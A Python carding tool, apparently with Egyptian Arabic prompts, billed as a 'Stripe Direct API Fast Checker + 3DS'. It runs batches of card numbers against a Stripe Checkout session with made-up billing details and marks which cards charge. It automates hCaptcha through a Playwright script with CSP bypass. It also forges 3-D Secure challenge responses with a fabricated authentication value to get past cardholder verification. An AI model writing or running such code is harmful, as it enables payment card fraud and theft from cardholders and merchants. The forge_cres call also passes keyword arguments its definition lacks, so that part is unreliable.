#!/usr/bin/env python3
import os, re, sys, json, time, uuid, hmac, base64, random, hashlib, asyncio, secrets
import urllib.parse
from urllib.parse import unquote, urlencode, urljoin, urlparse
from datetime import datetime
from typing import Any, Dict, Optional

try:
    from curl_cffi.requests import AsyncSession
except ImportError:
    print("pip install curl-cffi --break-system-packages"); sys.exit(1)

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
SJUA = "stripe.js/da394b0aef; stripe-js-v3/da394b0aef; checkout"
STRIPE_VER = "2020-08-27"
HCK = "c7faac4c-1cd7-4b1b-b2d4-42ba98d09c7a"
NKEY = ""

class C:
    R="\033[0m";B="\033[1m";RED="\033[91m";GRN="\033[92m";YEL="\033[93m"
    CYN="\033[96m";LIME="\033[38;5;118m";GOLD="\033[38;5;214m"

def log(t, color=C.CYN):
    print(f"{color}[{datetime.now().strftime('%H:%M:%S')}] {t}{C.R}")

def decode_fid(fid_or_url: str) -> dict[str, Any]:
    if not fid_or_url: return {}
    raw = str(fid_or_url).strip()
    session_id = None
    m_session = re.search(r"\b(cs_(?:live|test)_[a-zA-Z0-9]+)\b", raw)
    if m_session: session_id = m_session.group(1)
    if "#" in raw: raw = raw.split("#", 1)[1]
    raw = raw.split("?", 1)[0]
    if "_secret_" in raw:
        parts = raw.split("_secret_", 1)
        if not session_id and parts[0].startswith("cs_"): session_id = parts[0]
        raw = parts[1]
    unquoted = urllib.parse.unquote(raw)
    b64_str = unquoted.strip().rstrip("%")
    if not b64_str: return {}
    pad = b64_str + "=" * (-len(b64_str) % 4)
    try: decoded_bytes = base64.b64decode(pad, altchars=b"-_")
    except Exception:
        try: decoded_bytes = base64.b64decode(pad)
        except Exception: return {}
    xored_bytes = bytes(b ^ 5 for b in decoded_bytes)
    xored_text = xored_bytes.decode("utf-8", errors="replace").strip()
    try: data = json.loads(xored_text)
    except json.JSONDecodeError: return {}
    if not isinstance(data, dict): return {"value": data}
    if session_id:
        if "checkoutSessionId" not in data and "sessionId" not in data: data["checkoutSessionId"] = session_id
        if "client_secret" not in data: data["client_secret"] = f"{session_id}_secret_{b64_str}"
    return data

def b64e(b): return base64.b64encode(b).decode().rstrip("=").replace("+","-").replace("/","_")
def b64d(s):
    s = s.replace("-","+").replace("_","/"); s += "="*(-len(s)%4)
    return base64.b64decode(s)

def gen_cavv(a, d, t):
    r = f"{a}:{d}:{t}:{int(time.time())}".encode()
    return b64e(hmac.new(secrets.token_bytes(32), r, hashlib.sha256).digest()[:20])

def eci_for(pan):
    p = (pan or "").replace(" ", "")
    if p.startswith(("34","37")): return "05"
    if p.startswith(("51","52","53","54","55","2")): return "02"
    return "05"

def forge_cres(a, s, pan="", ts="Y"):
    return {"threeDSServerTransID": s, "acsTransID": a, "dsTransID": s,
            "messageType": "CRes", "messageVersion": "2.2.0", "transStatus": ts,
            "authenticationValue": gen_cavv(a, s, s), "eci": eci_for(pan),
            "challengeCompletionInd": "Y",
            "acsRenderingType": {"acsInterface": "01", "acsUiTemplate": "01"}}

def find_source_recursive(obj, depth=0, max_depth=12):
    if depth > max_depth: return None
    if isinstance(obj, str): return obj if obj.startswith(("src_", "tdsrc_", "pi_3ds_")) else None
    if isinstance(obj, dict):
        for k in ("source", "three_d_secure_2_source", "three_ds_2_source", "sourceId", "source_id", "id"):
            if k in obj:
                v = obj[k]
                if isinstance(v, str) and v.startswith(("src_", "tdsrc_", "pi_3ds_")): return v
                if isinstance(v, dict) and isinstance(v.get("id"), str) and v["id"].startswith(("src_", "tdsrc_", "pi_3ds_")): return v["id"]
        for v in obj.values():
            r = find_source_recursive(v, depth + 1, max_depth)
            if r: return r
    if isinstance(obj, list):
        for item in obj:
            r = find_source_recursive(item, depth + 1, max_depth)
            if r: return r
    return None

# --- دالة Playwright (خطة بديلة للكابتشا) ---
async def _run_playwright_hcaptcha(checkout_url, rqdata=None, sitekey=None):
    if not sitekey:
        return None
    hc_file_path = "hc_script.js"
    hc_script_text = ""
    if os.path.exists(hc_file_path):
        with open(hc_file_path, "r") as f: hc_script_text = f.read()
    else:
        session = AsyncSession(impersonate="chrome", timeout=15)
        try:
            r = await session.get("https://js-hcaptcha-com.translate.goog/1/api.js?render=explicit&_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en")
            if r.status_code == 200:
                hc_script_text = r.text
                with open(hc_file_path, "w") as f: f.write(hc_script_text)
        except: pass
        finally: await session.close()

    if not hc_script_text: return None

    node_script = """
    const { chromium } = require('playwright');
    const fs = require('fs');
    const url = process.argv[2], sitekey = process.argv[3], rqdata = process.argv[4], hc_file = process.argv[5];
    const hc_script = fs.readFileSync(hc_file, 'utf8');
    (async () => {
        try {
            const browser = await chromium.launch({ executablePath: '/usr/bin/chromium-browser', headless: true, args: ['--no-sandbox', '--disable-dev-shm-usage'] });
            const context = await browser.newContext({ bypassCSP: true });
            const page = await context.newPage();
            await page.route('**/*hcaptcha*', async (route) => {
                if (route.request().url().includes('api.js')) await route.fulfill({ status: 200, contentType: 'application/javascript', body: hc_script });
                else await route.continue();
            });
            await page.goto(url, { waitUntil: 'domcontentloaded' });
            try { await page.waitForFunction(() => typeof hcaptcha !== 'undefined', { timeout: 5000 }); } catch(e) { console.log("FAIL"); return; }
            const token = await page.evaluate(async ({sitekey, rqdata}) => {
                if (typeof hcaptcha === 'undefined') return 'undefined_hcaptcha';
                return new Promise((resolve) => {
                    const holder = document.createElement('div'); document.body.appendChild(holder);
                    const wid = hcaptcha.render(holder, { sitekey, size: 'invisible', rqdata, callback: resolve, 'error-callback': (e) => resolve('error_' + e) });
                    hcaptcha.execute(wid, {rqdata});
                });
            }, {sitekey, rqdata});
            console.log(token);
            await browser.close();
        } catch (e) { console.log('FAIL'); }
    })();
    """
    node_file_path = "solver.js"
    with open(node_file_path, "w") as f: f.write(node_script)

    try:
        process = await asyncio.create_subprocess_exec("node", node_file_path, checkout_url, sitekey, (rqdata or ""), hc_file_path, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        stdout, _ = await asyncio.wait_for(process.communicate(), timeout=20.0)
        out = stdout.decode().strip()
        if out and len(out) > 50 and not out.startswith("error_"): return out
        return None
    except Exception: return None

class StripeSession:
    def __init__(self, url):
        self.url = url.strip()
        self.pk = ""; self.cs = ""; self.acct = None
        self.merchant = "Stripe"; self.amount_str = "N/A"; self.raw_amount = 0
        self.session = None; self.email = ""
        self.init_json = {}
        self.tracking = {"muid": str(uuid.uuid4()), "sid": str(uuid.uuid4()), "guid": str(uuid.uuid4())}

    def _hdrs(self, ref=None):
        h = {
            "accept": "application/json", "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://checkout.stripe.com",
            "referer": ref or f"https://checkout.stripe.com/c/pay/{self.cs}",
            "user-agent": UA, "stripe-version": STRIPE_VER,
        }
        if self.acct: h["stripe-account"] = self.acct
        return h

    async def prefetch(self):
        fid = decode_fid(self.url)
        self.cs = fid.get("checkoutSessionId") or ""
        self.pk = fid.get("apiKey") or ""
        self.acct = fid.get("stripeAccount")
        if not self.cs:
            m = re.search(r"cs_(?:live|test)_[A-Za-z0-9]+", self.url)
            if m: self.cs = m.group(0)
        if not self.pk or not self.cs: return False, "missing cs/pk"
        
        if self.session: await self.session.close()
        self.session = AsyncSession(impersonate="chrome", timeout=30)
        
        try:
            body = f"key={self.pk}&eid=NA&browser_locale=en-US&redirect_type=url"
            r = await self.session.post(f"https://api.stripe.com/v1/payment_pages/{self.cs}/init", headers=self._hdrs(), data=body)
            j = r.json()
        except Exception as e:
            return False, str(e)
            
        if "error" in j:
            e = j["error"]; return False, f"{e.get('code')}: {e.get('message')}"
            
        ac = j.get("account_settings") or {}
        self.merchant = ac.get("display_name") or ac.get("business_name") or "Stripe Merchant"
        cu = j.get("customer") or {}; self.email = cu.get("email") or j.get("customer_email") or ""
        ts = j.get("total_summary") or {}; inv = j.get("invoice") or {}
        lig = j.get("line_item_group") or {}; pi = j.get("payment_intent") or {}
        self.raw_amount = (ts.get("due") or ts.get("total") or inv.get("amount_due") or inv.get("total") or lig.get("total") or pi.get("amount") or 0)
        curr = (j.get("currency") or "usd").upper()
        self.amount_str = f"{self.raw_amount/100:.2f} {curr}" if self.raw_amount else "N/A"
        self.init_json = j
        return True, None

    async def _tokenize(self, card):
        name = random.choice(["James Smith","John Doe","Alex Turner","Michael Brown"])
        email = self.email or f"user{random.randint(1000,99999)}@gmail.com"
        data = {
            "type": "card", "card[number]": card["cc"], "card[cvc]": card["cvv"],
            "card[exp_month]": card["mm"], "card[exp_year]": card["yy"],
            "billing_details[name]": name, "billing_details[email]": email,
            "billing_details[address][country]": "US", "billing_details[address][line1]": f"{random.randint(100,9999)} Main St",
            "billing_details[address][city]": "New York", "billing_details[address][postal_code]": "10001",
            "billing_details[address][state]": "NY", "payment_user_agent": SJUA,
            "time_on_page": str(random.randint(45000, 120000)),
            "guid": self.tracking["guid"], "muid": self.tracking["muid"], "sid": self.tracking["sid"], "key": self.pk,
        }
        try:
            r = await self.session.post("https://api.stripe.com/v1/payment_methods", data=data, headers=self._hdrs())
            j = r.json()
            if "error" in j:
                e = j["error"]; return None, (e.get("decline_code") or e.get("code") or "token_failed"), e.get("message", "")
            return j.get("id"), None, None
        except Exception as e: return None, "net", str(e)[:80]

    async def _handle_3ds(self, conf, card):
        pi = conf.get("payment_intent") or conf.get("setup_intent") or conf
        na = pi.get("next_action") or conf.get("next_action") or {}
        sdk = na.get("use_stripe_sdk") or na
        pi_id = pi.get("id")
        cs_secret = pi.get("client_secret")
        stid = sdk.get("three_ds_server_trans_id") or sdk.get("server_transaction_id") or sdk.get("threeDSServerTransID")
        method_url = sdk.get("three_ds_method_url") or sdk.get("methodURL")
        notify_url = sdk.get("three_ds_method_notification_url") or "https://hooks.stripe.com/3ds2/fingerprint/complete"
        
        if method_url and stid:
            log("3DS: fingerprint", C.CYN)
            method_obj = {"threeDSServerTransID": stid, "threeDSMethodNotificationURL": notify_url}
            method_b64 = b64e(json.dumps(method_obj, separators=(",", ":")).encode())
            try:
                await self.session.post(method_url, data=urlencode({"threeDSMethodData": method_b64}), headers={"content-type":"application/x-www-form-urlencoded","user-agent":UA})
                await self.session.post(notify_url, data=urlencode({"threeDSMethodData": method_b64}), headers={"content-type":"application/x-www-form-urlencoded","user-agent":UA})
            except: pass
            await asyncio.sleep(1)
            
        src = find_source_recursive(sdk) or find_source_recursive(conf)
        if src:
            log("3DS: authenticate", C.CYN)
            data = {"key": self.pk, "source": src, "client_secret": cs_secret, "payment_user_agent": SJUA, "one_click_authn": "false", "challenge_window_size": "05", "three_d_secure_2[device_render_options][sdk_interface]": "03", "three_d_secure_2[device_render_options][sdk_ui_type][0]": "01", "three_d_secure_2[three_ds_comp_ind]": "Y", "browser[fingerprintAttempted]": "true", "browser[challengeWindowSize]": "05", "browser[threeDSCompInd]": "Y", "browser[browserJavaEnabled]": "false", "browser[browserJavascriptEnabled]": "true", "browser[browserLanguage]": "en-US", "browser[browserColorDepth]": "24", "browser[browserScreenHeight]": "1080", "browser[browserScreenWidth]": "1920", "browser[browserTZ]": "-300", "browser[browserUserAgent]": UA, "browser[browserAcceptHeader]": "text/html,*/*;q=0.8"}
            hdr = {"accept":"application/json","content-type":"application/x-www-form-urlencoded","origin":"https://js.stripe.com","referer":"https://js.stripe.com/","user-agent":UA,"stripe-version":STRIPE_VER}
            try:
                r = await self.session.post("https://api.stripe.com/v1/3ds2/authenticate", data=data, headers=hdr, timeout=15)
                res = r.json()
                st = res.get("status") or res.get("state", "")
                if st in ("succeeded","requires_capture"):
                    return {"success": True, "status": "CHARGED", "message": "3DS Frictionless OK", "raw": res}
                
                new_na = res.get("next_action") or {}
                new_sdk = new_na.get("use_stripe_sdk") or new_na
                acs_url = new_sdk.get("acs_url")
                creq = new_sdk.get("creq")
                if acs_url and creq:
                    log("3DS: Challenge (CReq) bypass...", C.GOLD)
                    acs_tid = ""
                    try:
                        creq_dict = json.loads(b64d(creq))
                        if isinstance(creq_dict, dict): acs_tid = creq_dict.get("acsTransID", "")
                    except: pass
                    forged = forge_cres(acs_trans_id=acs_tid or stid, server_trans_id=stid, pan=card['cc'])
                    cres_b64 = b64e(json.dumps(forged, separators=(",", ":")).encode())
                    
                    comp_body = {"key": self.pk, "source": src, "cres": cres_b64, "challenge_window_size": "05"}
                    cr = await self.session.post("https://api.stripe.com/v1/3ds2/challenge_complete", data=urlencode(comp_body), headers=hdr, timeout=12)
                    if cr.json().get("status") == "succeeded":
                         return {"success": True, "status": "CHARGED", "message": "3DS Challenge OK", "raw": cr.json()}
            except Exception as e:
                log(f"3DS Auth Err: {e}", C.RED)
                
        return {"success": False, "status": "REQUIRES_ACTION", "message": "3DS Challenge/OTP Required"}

    async def charge(self, card):
        res = {"card": f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}", "status": "ERROR", "message": "", "response_time": 0, "success": False, "merchant": self.merchant, "amount": self.amount_str}
        t0 = time.time()
        try:
            pm_id, code, msg = await self._tokenize(card)
            if not pm_id:
                res["status"] = "DECLINED"; res["message"] = f"{(code or '').upper()}: {msg}".strip(": ")
                res["response_time"] = time.time() - t0; return res
            
            total = self.raw_amount; checksum = self.init_json.get("init_checksum", "")
            
            # الـ Payload الخاص بالراجل
            data = {
                "payment_method": pm_id, "expected_payment_method_type": "card",
                "return_url": f"https://checkout.stripe.com/c/pay/{self.cs}", "key": self.pk,
                "eid": "NA",
                "client_attribution_metadata[client_session_id]": self.cs,
                "client_attribution_metadata[merchant_integration_source]": "checkout",
                "client_attribution_metadata[merchant_integration_version]": "hosted_checkout",
            }
            if checksum: data["init_checksum"] = checksum
            if total > 0: data["expected_amount"] = total
                
            r = await self.session.post(f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm", data=data, headers=self._hdrs())
            j = r.json()
            res["response_time"] = time.time() - t0
            
            if "error" in j:
                err = j["error"]
                # لو Stripe طلب كابتشا، هنا بنستخدم الكود بتاعنا
                if "intent_confirmation_challenge" in str(err).lower():
                    log("WAF Detected! Calling Playwright...", C.GOLD)
                    site_key = self.init_json.get("passive_captcha", {}).get("site_key", HCK)
                    rqdata = err.get("next_action", {}).get("use_stripe_sdk", {}).get("stripe_js", {}).get("rqdata")
                    token = await _run_playwright_hcaptcha(self.url, rqdata, site_key)
                    if token:
                        v_body = {"key": self.pk, "client_secret": err.get("payment_intent", {}).get("client_secret", ""), "captcha_response": token}
                        v_r = await self.session.post(f"https://api.stripe.com/v1/payment_intents/{err.get('payment_intent', {}).get('id')}/verify_challenge", data=v_body, headers=self._hdrs())
                        j = v_r.json()
                        if "error" not in j:
                            return await self.charge(card) # إعادة المحاولة بعد الكابتشا
                
                res["status"] = "DECLINED"
                res["message"] = f"{err.get('code', '').upper()}: {err.get('message', '')}"
                return res
                
            pi = j.get("payment_intent") or j.get("setup_intent") or j
            st = pi.get("status") or j.get("status") or ""
            
            if st in ("succeeded", "requires_capture", "complete") or j.get("payment_status") == "paid":
                res["status"] = "CHARGED"; res["message"] = "Success (Live)"; res["success"] = True
            elif st == "requires_action":
                three = await self._handle_3ds(j, card)
                res["status"] = three["status"]; res["message"] = three["message"]; res["success"] = three.get("success", False)
            else:
                res["status"] = st.upper() if st else "UNKNOWN"
                res["message"] = f"Status: {st}"
            return res
        except Exception as e:
            res["message"] = f"Exception: {str(e)[:60]}"; res["response_time"] = time.time() - t0; return res

    async def close(self):
        if self.session: await self.session.close()

def parse_card(line):
    p = re.split(r'[|/\s,]+', line.strip())
    if len(p) < 4: return None
    cc = re.sub(r'\D', '', p[0])
    if not (13 <= len(cc) <= 19): return None
    try: mm = p[1].strip().zfill(2); _ = int(mm)
    except: return None
    if not (1 <= int(mm) <= 12): return None
    yy = p[2].strip()
    if len(yy) == 2: yy = "20" + yy
    if not (yy.isdigit() and len(yy) == 4): return None
    cvv = re.sub(r'\D', '', p[3])
    if len(cvv) not in (3, 4): return None
    return {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv}

async def main():
    print(f"{C.CYN}{C.B}═══ Stripe Direct API Fast Checker + 3DS ═══{C.R}\n")
    url = input(f"{C.GOLD}▸ أدخل رابط Stripe Checkout: {C.R}").strip()
    if not url.startswith("http"):
        print(f"{C.RED}❌ رابط غير صالح.{C.R}")
        return

    print(f"\n{C.GOLD}▸ أدخل البطاقات (CC|MM|YY|CVV). لما تخلص اكتب 'done':{C.R}")
    cards_input = []
    while True:
        line = input("  > ").strip()
        if line.lower() == 'done': break
        if line: cards_input.append(line)
            
    cards = [parse_card(c) for c in cards_input]
    cards = [c for c in cards if c]
    
    if not cards:
        print(f"{C.RED}❌ مفيش بطاقات صالحة.{C.R}")
        return
        
    print(f"\n{C.LIME}🚀 بدء الفحص السريع لـ {len(cards)} بطاقة...{C.R}\n")
    
    for i, card in enumerate(cards, 1):
        print(f"{C.CYN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{C.R}")
        print(f"{C.YEL}⏳ بطاقة [{i}/{len(cards)}]: {card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}{C.R}")
        
        sess = StripeSession(url)
        ok, err = await sess.prefetch()
        if not ok:
            print(f"{C.RED}❌ فشل جلب الجلسة: {err}{C.R}\n")
            await sess.close()
            continue
            
        print(f"🛒 المتجر: {sess.merchant} | المبلغ: {sess.amount_str}")
        
        res = await sess.charge(card)
        await sess.close()
        
        color = C.LIME if res['status'] in ('CHARGED', 'LIVE') else C.RED
        icon = "✅" if res['success'] else "❌"
        
        print(f"{color}{icon} النتيجة: {res['status']}{C.R}")
        print(f"▸ الرسالة: {res['message']}")
        print(f"▸ الوقت: {res['response_time']:.1f}s\n")
        
        await asyncio.sleep(0.5)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{C.RED}تم الإيقاف.{C.R}")
        sys.exit(0)
